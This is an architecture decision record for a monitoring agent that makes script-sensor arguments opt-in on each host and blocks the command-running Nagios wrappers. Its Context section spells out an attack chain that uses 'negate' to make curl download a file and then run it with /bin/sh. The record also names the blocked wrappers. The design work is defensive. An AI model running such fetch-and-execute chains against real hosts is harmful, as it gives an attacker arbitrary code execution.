# ADR-0112: Script arguments need the host's consent

Date: 2026-11-12
Status: accepted; amends ADR-0024

## Context

A security audit (part 4, agent endpoint) found that the `script` sensor's `args` are chosen entirely by the central server, from a charset that includes `/` and `-`, and that ADR-0024 suggests linking packaged plugins from `/usr/lib/nagios/plugins` into the script directory, or pointing `script_dir` there. That folder ships `negate` and `urlize`, which run their remaining arguments as a command, and `check_by_ssh`, which runs a chosen command on another host. With them, a compromised central server, a stolen admin account or a bad API row gets arbitrary code as the agent's user: `script=negate, args=/usr/bin/curl,-o/tmp/x,http://…`, then `script=negate, args=/bin/sh,/tmp/x`. ADR-0024 said scripts must treat arguments as untrusted, but these wrappers cannot, and other plugins take paths they write to (`check_log -O`). ADR-0024's aim, that the central server can run only what the host's administrator installed, did not hold.

## Decision

**Arguments are opt-in on each host.** `[sensors]` of `agent.toml` gets `script_args`, `"none"` (default) or `"any"`, also settable as `MONITORFLOW_SENSORS_SCRIPT_ARGS`. With `"none"`, `registry::build_local` refuses (`BuildError::Refused`) a `script` sensor whose `args` list anything, saying which setting allows them; `"any"` keeps ADR-0024's plain-word arguments. `registry::build`, used by the central server's API, still accepts arguments: only the agent knows what its host allows. `monitorflow-agent sensors probe` reads the same setting, so a local test shows the same refusal.

**Command-running wrappers are never run.** `negate`, `urlize` and `check_by_ssh`, with or without an extension and in any case, are refused as script names by `registry::build` (so the API refuses them too), and by the agent's checks, at build and before every run, when the script resolves to one of them through a symlink, whatever `script_args` says. The list is a backstop for the known wrappers, not the boundary; the boundary is `script_args` and what the administrator installs.

A per-script allowlist of arguments, or pinned arguments set in `agent.toml`, was considered. It would let a host allow arguments for one script only, but it is more configuration than a two-value switch, and an administrator who wants fixed arguments for a packaged plugin can install a two-line wrapper script that passes them. It stays a possible follow-up.

**Why `"none"` by default.** Agents that already run scripts with arguments refuse them after the update. The refusal is visible: it goes into the configuration acknowledgement ("refused by this agent: script `check_disk` has arguments, which this agent does not allow; …"), so the sensor shows as refused on the central server, and the five-minute retry (ADR-0024 amendment) starts it once `script_args = "any"` is set and the agent restarts. Defaulting to `"any"` would keep the hole open on every host whose administrator never reads this, which is the case the audit is about; the wrapper list alone would leave other argument-driven plugins exposed.

## Consequences

- Upgrade impact: script sensors with arguments stop on hosts without `script_args = "any"` until their administrator adds it and restarts the agent. Scripts without arguments, and every other sensor, are unaffected. The release notes must say so.
- A host that allows arguments trusts its central server with them; its administrator should still link in only plugins whose arguments are harmless, and never `script_dir = "/usr/lib/nagios/plugins"`.
- A script named like a wrapper (`negate.sh` of one's own) must be renamed.
